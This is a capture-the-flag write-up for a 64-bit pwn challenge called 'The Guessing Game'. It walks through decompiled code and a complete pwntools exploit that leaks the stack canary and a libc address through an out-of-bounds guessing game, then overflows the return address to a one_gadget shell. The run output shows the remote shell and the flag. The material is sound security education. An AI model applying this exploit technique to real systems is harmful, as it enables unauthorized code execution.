# The Guessing Game

The description for this challenge was as follows:

*The number one complaint I've had about recent CTFs is that there's not enough guessing. Time for that to change!*

This challenge was worth 300 points, and was rated at medium difficulty. By the end of the CTF, it had a total of 43 solves.

**TL;DR Solution:** Use the high-low game to leak relevant bytes from various stack offsets. By avoiding hitting offsets directly, you can leak the canary and a libc address in one run of the program, and use them to craft a functional overflow that ends in a working onegadget.


## Gathering Information

When we connect to the remote instance, we are asked to pick a number to guess (between 1 and 7) and then guess the number. In response, we get either "Too low" or "Too high"
```
knittingirl@piglet:~/CTF/RaRCTF/boring_flag_runner$ nc 193.57.159.27 55206

Which number are you guessing (0-7)? 5
Enter your guess: 6
Ouch, too low!

Which number are you guessing (0-7)? 3
Enter your guess: 7
Ouch, too low!

Which number are you guessing (0-7)? 
```
The main function in Ghidra shows a lot more information.The numbers that we are supposed to guess are based on a byte array stored on the stack. There is no bounds check on the indexes we enter, so we can attempt to guess any byte value on the stack, which obviously seems like a good potential source of address leaks. After correctly guessing 8 bytes, we are then allowed to input a string with read. Based on the location of the stack variable bein filled here, it can give us an overflow of up to 10 bytes. There is also a canary that will need to be taken care.
```
undefined8 main(EVP_PKEY_CTX *param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  byte guessed_num;
  int my_index;
  int i;
  uint j;
  byte stack_array [8];
  undefined local_28 [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
                    /* sets a time-based seed for rand, should be hackable. */
  init(param_1);
  i = 0;
  j = 0;
  while (j < 8) {
    iVar1 = rand();
    stack_array[(int)j] = (char)iVar1 + (char)(iVar1 / 0xff);
    j = j + 1;
  }
  while (i < 8) {
    printf("\nWhich number are you guessing (0-7)? ");
                    /* There's no verification on this */
    __isoc99_scanf("%u",&my_index);
    printf("Enter your guess: ");
                    /* Is the idea that I can eventually guess the canary, possibly other leaks as
                       well? */
    __isoc99_scanf(" %hhu",&guessed_num);
    if (guessed_num < stack_array[my_index]) {
      puts("Ouch, too low!");
    }
    else {
      if (stack_array[my_index] < guessed_num) {
        puts("Too high!");
      }
      else {
        i = i + 1;
        puts("You got it!");
      }
    }
  }
  getchar();
  printf("So, what did you think of my game? ");
                    /* obvious overflow */
  read(0,local_28,0x32);
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```
Finally, the binary does have a fairly significant range of protections. As the Ghidra showed, there is a canary. In addition, PIE and NX are enabled; the PIE in particular immediately flags as possibly problematic in a ROP-based attack.
```
knittingirl@piglet:~/CTF/RaRCTF/guessing$ checksec guess
[*] '/home/knittingirl/CTF/RaRCTF/guessing/guess'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

## Writing the Exploit

Obviously, one of the first things that I clearly needed to do with this information was to use the high-low game to leak the canary. To do this somewhat efficiently, I ended up using a form of a binary-search algorithm to narrow in a correct answer based on responses. Now, because of the PIE, even if I have correctly acquired the canary, without an additional leak of either a PIE or libc address, I have nowhere to jump to when forming a (short) ROPchain. I was actually stuck on this one for a bit; there were PIE and libc addresses in the stack to leak, but the loop terminates once you have correctly guessed 8 bytes. The canary always ends in '\x00', so that would take 7 guesses, then the libc address should always start with '\x7f', end with a consistent byte, and have another byte with a known nibble, leaving approximately 3 1/2 unknown bytes. After using our remaining guess, that's 2 1/2 unknown bytes; while theoretically possible to bruteforce, it seems unlikely.

At this point, I realized that I actually could be certain of a bytes value without technically hitting it. By default, my binary search algorithm never hit odd numbers until the very end of a search, on the eigthth guess, at which point I could derive the correct answer anyway without burning a guess. So I modified my algorithm, and now, the odds were reasonably high that I could leak two addresses in one run through the program!

Here is the code to leak the canary alone. Please note that I know that this is an unusual implementation of a binary search algorithm. This was the best way I could come up with to avoid hitting odd numbers and burning guesses, so while this code is long and ugly, it does work quite reliably:
```
count = 0

i = 1
depth = 0
addition = 0
canary = 0
while True:
	print(target.recvuntil(b'(0-7)?'))
	target.sendline(str(0x20 + i).encode('ascii'))
	print(target.recvuntil(b'guess:'))
	my_guess = 0x100 // 2 + addition
	print(hex(my_guess))
	target.sendline(str(my_guess).encode('ascii'))
	result = target.recvuntil(b'Which')
	depth += 1
	if b'low' in result:
		if depth == 7:
			my_guess += 1
			canary += (0x10 ** (2 * i)) * my_guess
			print(hex(canary))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += 0x100 // (2 ** (depth + 1))
	elif b'high' in result:
		if depth == 7:
			my_guess -= 1
			canary += (0x10 ** (2 * i)) * my_guess
			print(hex(canary))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += -1 * (0x100 // (2 ** (depth + 1)))
	else:
		canary += (0x10 ** ( 2 * i)) * my_guess
		print(hex(canary))
		i += 1
		depth = 0
		addition = 0
		count += 1
	if i == 8:
		break

```
Next, I had to decide exactly how to deal with my very limited space in which to create a ROPchain. If desired, I could leak the canary and a PIE value first, loop back to start, then leak libc and a stack address for good measure in the second round. For a while, I was very convinced that a stack pivot was the answer; the 10 bytes of overwrite seemed to be pointing in the that direction, plus I originally started debugging on my Kali machine, which places a libc address in rbp+0x8, and a stack address in rbp+0x10. If you have leaks for PIE and the stack, you can overwrite rbp+0x8 to a pop rsp gadget, modify the low two bytes of rbp+0x10 to point to the start of the stack address you filled, and jump to a ROP chain. Alas, this was not to be on the actual system; an inspection of the Dockerfile revealed that the challenge uses Ubuntu 20.04, and debugging on that machine shows libc addresses in both rbp+0x8 and rbp+0x10.
```
gef➤  x/gx $rbp+0x8
0x7ffebe24e448:	0x00007fb1245f30b3
gef➤  x/gx $rbp+0x10
0x7ffebe24e450:	0x00007fb1247fc620
```
So, instead, I turned to the idea of using a onegadget; this is an address in libc that will perform execve("/bin/sh") and produce a shell if certain conditions are met. 
```
knittingirl@piglet:~/CTF/RaRCTF/guessing$ one_gadget libc6_2.31-0ubuntu9.2_amd64.so 
0xe6e73 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6e76 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6e79 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
When we get to the end of main in GDB and check register contents, we can see that rdx is set to 0 by default. In addition, we can control the contents of rsi; since one of the last functions is a read call, and this places user-inputted data into the second parameter, we simply need to make sure that at least the first 8 characters of our user inputs are nulls. 
```
 read(0,local_28,0x32);
```
I came accross a final hurdle as I was running the exploit in GDB. During the course of the onegadget's execution, a value is moved into QWORD PTR [rbp-0x78]. This means that value of rbp-0x78 must be mapped, writable memory. Since I am overwriting rbp by necessity, I need to ensure that the value here meets my needs. 
```
→ 0x55e9a7f423a8 <main+395>       ret    
   ↳  0x7ff892f41e79 <execvpe+1145>   lea    rdi, [rip+0xd072a]        # 0x7ff8930125aa
      0x7ff892f41e80 <execvpe+1152>   mov    QWORD PTR [rbp-0x78], r11
      0x7ff892f41e84 <execvpe+1156>   call   0x7ff892f412f0 <execve>
```
So far, I have only needed to leak libc and a canary, so it makes the most sense to set rbp to a writable section of libc. I ended up picking a spot somewhat at random within the writable section and running with it; vmmap within GDB-GEF is probably the easiest way to find writable sections, and an exerpt is provided below.
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000055e9a7f41000 0x000055e9a7f42000 0x0000000000000000 r-- /home/ubuntu/Downloads/guess
0x000055e9a7f42000 0x000055e9a7f43000 0x0000000000001000 r-x /home/ubuntu/Downloads/guess
0x000055e9a7f43000 0x000055e9a7f44000 0x0000000000002000 r-- /home/ubuntu/Downloads/guess
0x000055e9a7f44000 0x000055e9a7f45000 0x0000000000002000 r-- /home/ubuntu/Downloads/guess
0x000055e9a7f45000 0x000055e9a7f46000 0x0000000000003000 rw- /home/ubuntu/Downloads/guess
0x00007ff892e5b000 0x00007ff892e80000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ff892e80000 0x00007ff892ff8000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ff892ff8000 0x00007ff893042000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ff893042000 0x00007ff893043000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ff893043000 0x00007ff893046000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ff893046000 0x00007ff893049000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ff893049000 0x00007ff89304f000 0x0000000000000000 rw- 
0x00007ff89305e000 0x00007ff89305f000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ff89305f000 0x00007ff893082000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ff893082000 0x00007ff89308a000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ff89308b000 0x00007ff89308c000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ff89308c000 0x00007ff89308d000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ff89308d000 0x00007ff89308e000 0x0000000000000000 rw- 
0x00007fff0882a000 0x00007fff0884b000 0x0000000000000000 rw- [stack]
0x00007fff089c7000 0x00007fff089cb000 0x0000000000000000 r-- [vvar]
0x00007fff089cb000 0x00007fff089cd000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```
Finally, I was able to put all of this together into a working exploit script. I leak the canary and a libc address from the stack, then send input designed to get my onegadget to pop a shell. The exploit does not work 100% of the time, but it should succeed more often than not.
```
from pwn import *

#target = process('./guess')

#pid = gdb.attach(target, "\nb *main+356\n set disassembly-flavor intel\ncontinue")

target = remote('193.57.159.27', 55206)
elf = ELF('guess')

libc = ELF('libc6_2.31-0ubuntu9.2_amd64.so')
count = 0

i = 1
depth = 0
addition = 0
canary = 0
while True:
	print(target.recvuntil(b'(0-7)?'))
	target.sendline(str(0x20 + i).encode('ascii'))
	print(target.recvuntil(b'guess:'))
	my_guess = 0x100 // 2 + addition
	print(hex(my_guess))
	target.sendline(str(my_guess).encode('ascii'))
	result = target.recvuntil(b'Which')
	depth += 1
	if b'low' in result:
		if depth == 7:
			my_guess += 1
			canary += (0x10 ** (2 * i)) * my_guess
			print(hex(canary))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += 0x100 // (2 ** (depth + 1))
	elif b'high' in result:
		if depth == 7:
			my_guess -= 1
			canary += (0x10 ** (2 * i)) * my_guess
			print(hex(canary))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += -1 * (0x100 // (2 ** (depth + 1)))
	else:
		canary += (0x10 ** ( 2 * i)) * my_guess
		print(hex(canary))
		i += 1
		depth = 0
		addition = 0
		count += 1
	if i == 8:
		break

i = 1
depth = 0
addition = 0
libc_leak = 0xb3

while True:
	print(target.recvuntil(b'(0-7)?'))
	target.sendline(str(0x30 + i).encode('ascii'))
	print(target.recvuntil(b'guess:'))
	my_guess = 0x100 // 2 + addition
	print(hex(my_guess))
	target.sendline(str(my_guess).encode('ascii'))
	result = target.recvuntil(b'Which')
	depth += 1
	print(depth)
	if b'low' in result:
		if depth == 7:
			my_guess += 1
			libc_leak += (0x10 ** (2 * i)) * my_guess
			print(hex(libc_leak))
			i += 1
			depth = 0
			addition = 0
			
		else:
			addition += 0x100 // (2 ** (depth + 1))
		
	elif b'high' in result:
		if depth == 7:
			my_guess -= 1
			libc_leak += (0x10 ** (2 * i)) * my_guess
			print(hex(libc_leak))
			i += 1
			depth = 0
			addition = 0
		else:
			addition += -1 * (0x100 // (2 ** (depth + 1)))
		if my_guess == 0x1:
			my_guess = 0
			libc_leak += (0x10 ** (2 * i)) * my_guess
			print(hex(libc_leak))
			i += 1
			depth = 0
			addition = 0
	else:
		libc_leak += (0x10 ** (2 * i)) * my_guess
		print(hex(libc_leak))
		i += 1
		depth = 0
		addition = 0
		count += 1
	if i == 6:
		break
	

print('i used', count, 'guesses')
print('canary is', hex(canary))
print('libc leak is', hex(libc_leak))

#target.interactive()
for i in range(8 - count):
	print(target.recvuntil(b'(0-7)?', timeout=1))
	target.sendline(str(0x20).encode('ascii'))
	print(target.recvuntil(b'guess:', timeout=1))
	my_guess = 0
	print(hex(my_guess))
	target.sendline(str(my_guess).encode('ascii'))


print(target.recvuntil(b'game?'))

libc_start_main = libc_leak - 243
libc_base = libc_start_main - libc.symbols['__libc_start_main']
print('libc start main is at', hex(libc_start_main))

onegadget1 = libc_base + 0xe6e73
onegadget2 = libc_base + 0xe6e76
onegadget3 = libc_base + 0xe6e79


payload = b'\x00' * 24

payload += p64(canary)
payload += p64(libc_base + 0x1ee100)

payload += p64(onegadget3) 


target.sendline(payload)


target.interactive()

```
And here are the results:
```
knittingirl@piglet:~/CTF/RaRCTF/guessing$ python3 guess_payload_final.py 
[+] Opening connection to 193.57.159.27 on port 55206: Done
[*] '/home/knittingirl/CTF/RaRCTF/guessing/guess'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/knittingirl/CTF/RaRCTF/guessing/libc6_2.31-0ubuntu9.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\nWhich number are you guessing (0-7)?'
b' Enter your guess:'
0x80
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xc0
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xe0
0xe000
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x20
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x30
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x28
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x2c
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x2e
0x2fe000
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x20
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x10
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x8
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xc
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xa
0xa2fe000
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xc0
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xe0
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xd0
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xc8
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xc4
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xc6
0xc60a2fe000
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x20
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x10
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x18
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x14
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x12
0x11c60a2fe000
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x60
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x50
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x58
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x54
0x5411c60a2fe000
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x20
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x10
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x18
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x14
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x12
0x125411c60a2fe000
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
1
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xc0
2
b' number are you guessing (0-7)?'
b' Enter your guess:'
0xa0
3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x90
4
0x90b3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
1
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
2
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x20
3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x30
4
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x28
5
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x2c
6
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x2e
7
0x2d90b3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
1
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
2
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x20
3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x10
4
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x18
5
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x14
6
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x16
7
0x152d90b3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
1
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
2
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x60
3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x70
4
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x78
5
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x74
6
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x76
7
0x76152d90b3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x80
1
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x40
2
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x60
3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x70
4
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x78
5
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x7c
6
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x7e
7
0x7f76152d90b3
i used 7 guesses
canary is 0x125411c60a2fe000
libc leak is 0x7f76152d90b3
b' number are you guessing (0-7)?'
b' Enter your guess:'
0x0
b' You got it!\nSo, what did you think of my game?'
libc start main is at 0x7f76152d8fc0
[*] Switching to interactive mode
 $ ls
bin
boot
dev
etc
flag.txt
guess
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt
rarctf{4nd_th3y_s41d_gu3ss1ng_1snt_fun!!_c9cbd665}
$  
```
Thanks for reading!
